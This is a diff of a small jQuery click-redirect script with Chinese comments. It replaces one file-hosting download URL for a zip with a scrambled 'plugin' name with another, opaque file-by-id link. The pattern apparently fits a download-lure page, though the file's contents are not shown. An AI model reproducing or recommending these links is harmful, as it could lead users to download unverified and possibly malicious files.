@@ -1,6 +1,6 @@
 $(function () {
 	// 设置跳转路径
-	var url = "https://ss313sl.s3.ap-northeast-2.amazonaws.com/Fasxientgfm%E6%8F%92%E4%BB%B67.9.81.zip"; //如果是外部链接 ' ' 中则全部替换为完整网址链接 如：'https://www.example.com'
+	var url = "https://f005.backblazeb2.com/b2api/v1/b2_download_file_by_id?fileId=4_z64b9c51816b9c17a9a8a0311_f103a9b38b4540457_d20250902_m074943_c005_v0501037_t0004_u01756799383075"; //如果是外部链接 ' ' 中则全部替换为完整网址链接 如：'https://www.example.com'
 
 	// 使用querySelectorAll获取所有具有特定类名的元素
 	var clickableElements = document.querySelectorAll(".clickableClass"); // 假设class是clickableClass
